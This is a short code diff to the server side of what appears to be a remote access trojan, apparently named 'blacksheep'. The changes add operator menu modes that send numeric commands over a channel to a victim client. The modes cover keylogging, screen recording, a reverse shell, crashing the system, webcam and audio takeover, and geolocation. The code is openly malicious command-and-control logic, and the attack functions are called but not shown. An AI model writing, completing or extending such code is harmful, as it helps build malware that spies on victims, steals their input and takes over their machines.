@@ -55,30 +55,48 @@ class Server:
             self.choice = int(input("choose your attack mode: "))
             if self.choice == 1:
                 #screen recording goes here
+                print("SCREEN MODE ACTIVATED")
+                self.test = "1".encode("utf-8")
+                self.channel.send(self.test)
                 self.screen_record()
                 pass
             if self.choice == 2:
                 #keylogger codes goes here
+                print("KEYLOGGER MODE ACTIVATED")
+                self.test = "2".encode("utf-8")
+                self.channel.send(self.test)
                 self.keylogger()
                 pass
             if self.choice == 3:
                 #screen reverse shell goes here
+                print("REVERSE SHELL MODE ACTIVATED")
+                self.test = "3".encode("utf-8")
+                self.channel.send(self.test)
                 self.reverse_shell()
                 pass
             if self.choice == 4:
                 #crashing the entire system
+                print("MALWARE MODE ACTIVATED")
+                self.test = "4".encode("utf-8")
+                self.channel.send(self.test)
                 self.crash_sys()
                 pass
             if self.choice == 5:
                 #take over cameras and audio
+                print("WEBCAM MODE ACTIVATED")
+                self.test = "5".encode("utf-8")
+                self.channel.send(self.test)
                 self.webcam()
                 pass
             if self.choice == 6:
                 #get the exact locations
+                print("GEOLOCATION MODE ACTIVATED")
+                self.test = "6".encode("utf-8")
+                self.channel.send(self.test)
                 self.geolocate()                    
                 pass
             if self.choice == 7:
-                print("chat with blacksheep activated")
+                print("CHAT MODE ACTIVATED")
                 self.test = "7".encode("utf-8")
                 self.channel.send(self.test)
                 #chat with client
